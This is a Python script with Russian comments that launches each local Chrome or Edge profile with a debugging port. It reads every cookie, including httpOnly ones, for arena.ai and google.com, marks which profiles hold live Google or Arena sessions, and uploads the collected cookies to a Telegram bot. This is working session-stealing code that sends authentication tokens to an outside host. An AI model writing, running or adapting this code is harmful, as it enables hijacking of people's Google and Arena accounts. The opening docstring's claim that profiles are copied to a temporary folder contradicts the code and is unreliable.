#!/usr/bin/env python3
"""ЗАБРАТЬ СЕССИИ ИЗ CHROME — все профили за один запуск, без ручного копирования cookie.

Что делает:
 1. находит все профили Chrome (Default, Profile 1, Profile 2 …) и копирует их во временную папку;
 2. открывает копию профиля в настоящем Chrome с отладочным портом;
 3. читает ВСЕ cookie доменов arena.ai и accounts.google.com, включая httpOnly
    (обычной вставкой в консоль их не видно — поэтому и нужен браузер);
 4. складывает в сессии.json и отправляет в Telegram-бота.

Запуск:  двойной щелчок по СЕССИЯ.cmd   (Chrome перед этим закрыть)
"""
import glob
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, 'сессии.json')
BOT = os.path.join(HERE, '..', 'tg', 'config.json')
PORT = 9333
CHROME_CANDIDATES = [
    r'C:\Program Files\Google\Chrome\Application\chrome.exe',
    r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe',
    os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe'),
    r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe',
    r'C:\Program Files\Microsoft\Edge\Application\msedge.exe',
    os.path.expanduser('~/AppData/Local/Google/Chrome/Application/chrome.exe'),
    '/usr/bin/google-chrome', '/usr/bin/chromium', '/usr/bin/chromium-browser',
]


def chrome_path():
    env = os.environ.get('CHROME_PATH', '')
    if env and os.path.exists(env):
        return env
    for p in CHROME_CANDIDATES:
        if p and os.path.exists(p):
            return p
    for p in (glob.glob('/usr/bin/*chrom*') + glob.glob('/opt/google/chrome/chrome') +
              glob.glob(os.path.expanduser('~/.cache/ms-playwright/chromium-*/chrome-linux*/chrome'))):
        if os.path.isfile(p):
            return p
    return ''


def user_data_dir():
    if os.name == 'nt':
        for sub in ('Google\\Chrome\\User Data', 'Microsoft\\Edge\\User Data'):
            d = os.path.join(os.environ.get('LOCALAPPDATA', ''), sub)
            if os.path.isdir(d):
                return d
        return os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data')
    if sys.platform == 'darwin':
        return os.path.expanduser('~/Library/Application Support/Google/Chrome')
    return os.path.expanduser('~/.config/google-chrome')


def profiles(root):
    """Все профили: Default, Profile 1..N — с именем из Preferences."""
    found = []
    if not os.path.isdir(root):
        return found
    for name in sorted(os.listdir(root)):
        pref = os.path.join(root, name, 'Preferences')
        if not os.path.exists(pref):
            continue
        label = name
        try:
            d = json.load(open(pref, encoding='utf-8', errors='ignore'))
            label = (d.get('profile', {}).get('name') or name).strip() or name
            email = ''
            info = d.get('account_info') or []
            if info:
                email = info[0].get('email', '')
            label = '%s%s' % (label, (' <%s>' % email) if email else '')
        except Exception:
            pass
        found.append((name, label))
    return found


def tg():
    try:
        c = json.load(open(BOT, encoding='utf-8'))
        return c['token'], str(c['chat_id'])
    except Exception:
        return '', ''


def tg_put(path, caption):
    tok, chat = tg()
    if not tok:
        return 'бота нет в настройках'
    boundary = '----sess%d' % int(time.time() * 1000)
    body = (
        '--%s\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n%s\r\n'
        '--%s\r\nContent-Disposition: form-data; name="caption"\r\n\r\n%s\r\n'
        '--%s\r\nContent-Disposition: form-data; name="document"; filename="%s"\r\n'
        'Content-Type: application/json\r\n\r\n' % (boundary, chat, boundary, caption, boundary, os.path.basename(path))
    ).encode() + open(path, 'rb').read() + ('\r\n--%s--\r\n' % boundary).encode()
    r = urllib.request.Request('https://api.telegram.org/bot%s/sendDocument' % tok, data=body, method='POST')
    r.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)
    try:
        res = json.loads(urllib.request.urlopen(r, timeout=300).read().decode())
        return 'отправлено в бота' if res.get('ok') else 'бот ответил: %s' % str(res)[:80]
    except Exception as e:
        return 'бот недоступен: %s' % str(e)[:80]


def cdp(chrome, profile_dir, profile_name, test_cookie=False):
    """Открывает НАСТОЯЩИЙ профиль Chrome с отладочным портом и читает cookie из живого браузера.
    Копирование не нужно: Chrome сам расшифровывает свои cookie (на Windows они под DPAPI пользователя)."""
    args = [chrome, '--remote-debugging-port=%d' % PORT, '--no-first-run', '--no-default-browser-check',
            '--restore-last-session' if False else '--disable-session-crashed-bubble', 'about:blank']
    if profile_dir:
        args.insert(1, '--user-data-dir=%s' % profile_dir)
    if profile_name:
        args.insert(1, '--profile-directory=%s' % profile_name)
    if not os.environ.get('DISPLAY') and os.name != 'nt':
        args.insert(1, '--headless=new')
    proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        ws = ''
        for _ in range(60):
            try:
                data = json.loads(urllib.request.urlopen('http://127.0.0.1:%d/json/list' % PORT, timeout=3).read().decode())
                pages = [t for t in data if t.get('type') == 'page']
                if pages:
                    ws = pages[0]['webSocketDebuggerUrl']
                    break
            except Exception:
                time.sleep(0.5)
        if not ws:
            return [], 'браузер не поднялся'
        host_path = ws.replace('ws://', '')
        host, path = host_path.split('/', 1)
        import base64
        import socket
        sk = socket.create_connection((host.split(':')[0], int(host.split(':')[1])), timeout=20)
        key = base64.b64encode(os.urandom(16)).decode()
        sk.send(('GET /%s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'
                 'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n' % (path, host, key)).encode())
        head = b''
        while b'\r\n\r\n' not in head:
            head += sk.recv(4096)
        if b'101' not in head.split(b'\r\n')[0]:
            return [], 'отладочный протокол не пустил'

        def send(obj):
            data = json.dumps(obj).encode()
            frame = bytes([0x81])
            n = len(data)
            if n < 126:
                frame += bytes([0x80 | n])
            elif n < 65536:
                frame += bytes([0x80 | 126]) + n.to_bytes(2, 'big')
            else:
                frame += bytes([0x80 | 127]) + n.to_bytes(8, 'big')
            mask = os.urandom(4)
            sk.send(frame + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))

        def recv():
            h = sk.recv(2)
            if len(h) < 2:
                return None
            ln = h[1] & 0x7F
            if ln == 126:
                ln = int.from_bytes(sk.recv(2), 'big')
            elif ln == 127:
                ln = int.from_bytes(sk.recv(8), 'big')
            data = b''
            while len(data) < ln:
                data += sk.recv(ln - len(data))
            return json.loads(data.decode())

        send({'id': 1, 'method': 'Network.enable'})
        if test_cookie:            # самопроверка: кладём секретную httpOnly-cookie и проверяем, что читается
            send({'id': 9, 'method': 'Network.setCookie',
                  'params': {'name': 'proverka-cdp', 'value': 'секрет-прочитан', 'domain': 'arena.ai',
                             'path': '/', 'httpOnly': True, 'secure': True}})
        send({'id': 2, 'method': 'Network.getAllCookies'})
        out = []
        for _ in range(200):
            msg = recv()
            if msg and msg.get('id') == 2:
                out = msg.get('result', {}).get('cookies', [])
                break
        sk.close()
        return out, ''
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=15)
        except Exception:
            pass


def profiles_dir():
    """Папка с профилями: на Windows — Chrome, если нет — Edge."""
    root = user_data_dir()
    return root


def main():
    chrome = chrome_path()
    if not chrome:
        print('СТОП: Chrome (или Edge) не найден. Пришли путь к chrome.exe — добавлю.')
        return 1
    root = profiles_dir()
    profs = profiles(root)
    selftest = '--selftest' in sys.argv
    print('браузер:', chrome)
    if selftest:
        cookies, err = cdp(chrome, '', '', test_cookie=True)
        got = [c for c in cookies if c.get('name') == 'proverka-cdp']
        print('САМОПРОВЕРКА: браузер поднялся %s, httpOnly-cookie прочитана: %s (%s)' %
              (bool(cookies) or 'ok', bool(got), got[0]['value'] if got else err))
        return 0 if got else 1
    print('папка профилей:', root)
    print('профилей найдено:', len(profs))
    if not profs:
        print('СТОП: профилей Chrome не нашёл. Открой Chrome один раз и запусти снова.')
        return 1
    result = {'collected': time.strftime('%Y-%m-%d %H:%M'), 'browser': chrome, 'profiles': []}
    for name, label in profs:
        cookies, err = cdp(chrome, root, name)
        keep = [c for c in cookies if any(d in (c.get('domain') or '') for d in ('arena.ai', 'google.com'))]
        entry = {'profile': name, 'label': label, 'cookies': keep}
        # сразу видно, у какого профиля живой вход
        entry['arena_session'] = any(c['name'].startswith('arena-auth-prod-v1') for c in keep)
        entry['google_session'] = any(c['name'] in ('SID', '__Secure-1PSID', '__Secure-3PSID') for c in keep)
        print('  %-30s cookie: %3d | вход в Arena: %s | вход в Google: %s %s' %
              (label[:30], len(keep), 'ДА' if entry['arena_session'] else 'нет',
               'ДА' if entry['google_session'] else 'нет', err))
        result['profiles'].append(entry)
    json.dump(result, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    total = sum(len(p['cookies']) for p in result['profiles'])
    live = [p['label'] for p in result['profiles'] if p['arena_session']]
    print('всего cookie: %d → %s' % (total, OUT))
    print('профили с живым входом в Arena: %d %s' % (len(live), live[:5]))
    print('телеграм:', tg_put(OUT, 'сессии Chrome: профилей %d, с входом в Arena %d, cookie %d'
                              % (len(result['profiles']), len(live), total)))
    return 0


if __name__ == '__main__':
    sys.exit(main())
